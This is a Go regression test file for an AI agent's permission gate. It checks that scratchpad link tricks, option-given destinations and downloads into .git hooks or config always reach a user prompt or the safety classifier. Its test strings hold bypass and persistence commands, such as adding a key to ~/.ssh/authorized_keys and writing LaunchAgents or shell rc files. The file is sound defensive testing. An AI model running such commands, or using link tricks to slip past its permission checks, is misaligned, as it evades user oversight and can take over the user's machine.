package permission

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/andrepato/harness/internal/claude/settings"
)

// Regression tests for review leads on the scratchpad fast path and the
// bash write analysis. Each case must reach a prompt (or the classifier in
// auto mode): none may run unasked.

// mustPromptOrBlock runs req in manual mode with a scratchpad and fails when
// it runs without the user being asked.
func mustPromptOrBlock(t *testing.T, root, scratch string, req Request) {
	t.Helper()
	g, p, _ := scratchGate(t, settings.ModeManual, settings.Permissions{}, root, scratch)
	blocked, _, err := g.CheckWithOutcome(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	if blocked == nil && len(p.reqs) == 0 {
		t.Errorf("%s(%s) ran without a prompt", req.ToolName, req.PrimaryArg)
	}
}

// 1. A hard link in the scratchpad to a file elsewhere is that file: a
// write through it is not a scratchpad write. (/private/tmp, /private/var
// and /Users share one volume on the machine this was written on, so the
// links below are real cross-directory links.)
func TestScratchpad_HardLinkIsNotInside(t *testing.T) {
	root, scratch := scratchFixture(t)
	elsewhere := t.TempDir()
	for name, target := range map[string]string{
		"workspace file": filepath.Join(root, "main.go"),
		"outside file":   filepath.Join(elsewhere, "notes.txt"),
	} {
		t.Run(name, func(t *testing.T) {
			if err := os.WriteFile(target, []byte("x"), 0o644); err != nil {
				t.Fatal(err)
			}
			link := filepath.Join(scratch, "h-"+filepath.Base(target))
			if err := os.Link(target, link); err != nil {
				t.Fatal(err)
			}
			mustPromptOrBlock(t, root, scratch, Request{ToolName: "write", PrimaryArg: link, Args: map[string]any{"path": link}})
			mustPromptOrBlock(t, root, scratch, Request{ToolName: "edit", PrimaryArg: link, Args: map[string]any{"path": link}})
			mustPromptOrBlock(t, root, scratch, bashReq("echo x >> "+link))
			mustPromptOrBlock(t, root, scratch, bashReq("touch "+link))
		})
	}
}

// 2. A link made and written through in one command line: the analysis sees
// the filesystem before the line runs, so it must not trust either step.
func TestScratchpad_LinkThenWriteInOneLine(t *testing.T) {
	root, scratch := scratchFixture(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	file := filepath.Join(root, "file")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	// A link already in the scratchpad that points out of it: moving it
	// and writing through its new name is a write outside.
	if err := os.Symlink(root, filepath.Join(scratch, "a")); err != nil {
		t.Fatal(err)
	}
	for _, cmd := range []string{
		"ln -s ~/x " + scratch + "/l && echo hi > " + scratch + "/l/f",
		"ln -s " + root + " " + scratch + "/l && echo hi > " + scratch + "/l/f",
		"ln " + file + " " + scratch + "/h; echo x >> " + scratch + "/h",
		"cp -R " + root + " " + scratch + "/copy && echo x > " + scratch + "/copy/f",
		"cp -a " + root + " " + scratch + "/copy",
		"mv " + scratch + "/a " + scratch + "/b && echo x > " + scratch + "/b/f",
	} {
		mustPromptOrBlock(t, root, scratch, bashReq(cmd))
	}

	// Plain file commands with the options that copy no link still run
	// without a prompt.
	for _, cmd := range []string{
		"mkdir -p " + scratch + "/d && touch " + scratch + "/d/x",
		"cp -p " + scratch + "/d/x " + scratch + "/d/y",
		"mv -f " + scratch + "/d/y " + scratch + "/d/z; rm -rf " + scratch + "/d",
	} {
		g, p, _ := scratchGate(t, settings.ModeManual, settings.Permissions{}, root, scratch)
		blocked, _, err := g.CheckWithOutcome(context.Background(), bashReq(cmd))
		if err != nil || blocked != nil || len(p.reqs) != 0 {
			t.Errorf("%q: blocked=%v prompts=%d err=%v, want it to run", cmd, blocked != nil, len(p.reqs), err)
		}
	}
}

// 3. A destination given by an option is the destination: the analysis
// must see it, for the scratchpad, for deny rules and for protected paths.
func TestScratchpad_OptionDestinations(t *testing.T) {
	root, scratch := scratchFixture(t)
	elsewhere := t.TempDir()
	src := filepath.Join(scratch, "src")
	for _, cmd := range []string{
		"cp -t " + elsewhere + " " + src,
		"cp --target-directory=" + elsewhere + " " + src,
		"cp --target-directory " + elsewhere + " " + src,
		"mv -t " + elsewhere + " " + src,
		"ln -t " + elsewhere + " " + src,
		"install -t " + elsewhere + " " + src,
		"cp " + src + " " + scratch + "/ -t " + elsewhere,
	} {
		mustPromptOrBlock(t, root, scratch, bashReq(cmd))
	}

	// Deny rules see an option-supplied destination too.
	g := NewGate(GateOptions{Permissions: settings.Permissions{Deny: []string{"Edit(/secrets/**)"}}, Mode: settings.ModeBypassPermissions, Roots: []string{root}})
	for _, cmd := range []string{
		"cp -t secrets " + src,
		"cp --target-directory=secrets " + src,
	} {
		if blocked, _, _ := g.CheckWithOutcome(context.Background(), bashReq(cmd)); blocked == nil {
			t.Errorf("%q: a deny rule on the destination did not apply", cmd)
		}
	}
	// And so do protected paths, past a narrow allow rule, in auto mode.
	for _, cmd := range []string{"cp -t .git/hooks " + src, "install -t .husky " + src} {
		c := allowAll()
		g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: []string{"Bash(" + cmd + ")"}}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
		if _, _, err := g.CheckWithOutcome(context.Background(), bashReq(cmd)); err != nil {
			t.Fatal(err)
		}
		if len(c.calls) != 1 {
			t.Errorf("%q: a protected destination skipped the classifier", cmd)
		}
	}
}

// 4. Programs whose written files kiln does not model are "can't tell":
// past a narrow allow rule, auto mode still classifies them.
func TestAutoMode_UnmodelledWritersAreClassified(t *testing.T) {
	root := t.TempDir()
	for _, cmd := range []string{
		"curl -o .git/config https://x.example/c",
		"curl https://x.example/c --output .git/config",
		"wget -O .git/config https://x.example/c",
		"wget https://x.example/hook",
		"tar -xf a.tar -C .git/hooks",
		"unzip a.zip -d .git",
		"rsync -a src/ .git/",
		"git clone https://x.example/r.git .git/x",
		"scp host:f .git/config",
		"patch -p1 -i x.diff",
	} {
		c := allowAll()
		g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: []string{"Bash(" + cmd + ")"}}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
		if _, _, err := g.CheckWithOutcome(context.Background(), bashReq(cmd)); err != nil {
			t.Fatal(err)
		}
		if len(c.calls) != 1 {
			t.Errorf("%q: skipped the classifier past a narrow allow rule", cmd)
		}
	}
	// dd's of= is modelled: a protected target is caught, a plain one is not.
	for cmd, want := range map[string]int{"dd if=a of=.git/config": 1, "dd if=a of=out.bin": 0} {
		c := allowAll()
		g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: []string{"Bash(" + cmd + ")"}}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
		_, _, _ = g.CheckWithOutcome(context.Background(), bashReq(cmd))
		if len(c.calls) != want {
			t.Errorf("%q: classifier calls = %d, want %d", cmd, len(c.calls), want)
		}
	}
}

// 5. A bash write to a protected path outside the workspace asks in auto
// mode, as a file tool's does: it does not go to the classifier.
func TestAutoMode_BashProtectedOutsideAsks(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, "Library", "LaunchAgents"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, cmd := range []string{
		"echo x >> ~/.zshrc",
		"echo x >> " + filepath.Join(home, ".bashrc"),
		"cp f.plist ~/Library/LaunchAgents/",
		"echo key >> ~/.ssh/authorized_keys",
	} {
		c := allowAll()
		g := NewGate(GateOptions{Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
		p := &promptRecorder{kind: PromptDeny}
		g.SetPrompter(p.prompt)
		blocked, _, err := g.CheckWithOutcome(context.Background(), bashReq(cmd))
		if err != nil {
			t.Fatal(err)
		}
		if len(c.calls) != 0 || len(p.reqs) != 1 || blocked == nil {
			t.Errorf("%q: classifier=%d prompts=%d blocked=%v, want a prompt and no classifier call", cmd, len(c.calls), len(p.reqs), blocked != nil)
		}
	}
	// The file tools agree, for kiln's additions to the list too.
	for _, f := range []string{
		filepath.Join(home, ".ssh", "authorized_keys"),
		filepath.Join(home, "Library", "LaunchAgents", "x.plist"),
		filepath.Join(home, ".config", "systemd", "user", "x.service"),
	} {
		c := allowAll()
		g := NewGate(GateOptions{Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
		p := &promptRecorder{kind: PromptDeny}
		g.SetPrompter(p.prompt)
		if _, _, err := g.CheckWithOutcome(context.Background(), Request{ToolName: "write", PrimaryArg: f, Args: map[string]any{"path": f}}); err != nil {
			t.Fatal(err)
		}
		if len(c.calls) != 0 || len(p.reqs) != 1 {
			t.Errorf("write %s: classifier=%d prompts=%d, want a prompt", f, len(c.calls), len(p.reqs))
		}
	}
	// Inside the workspace a protected write is still classified.
	c := allowAll()
	g := NewGate(GateOptions{Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
	if _, _, err := g.CheckWithOutcome(context.Background(), bashReq("echo x >> .zshrc")); err != nil {
		t.Fatal(err)
	}
	if len(c.calls) != 1 {
		t.Errorf("a protected write in the workspace: classifier calls = %d, want 1", len(c.calls))
	}
}
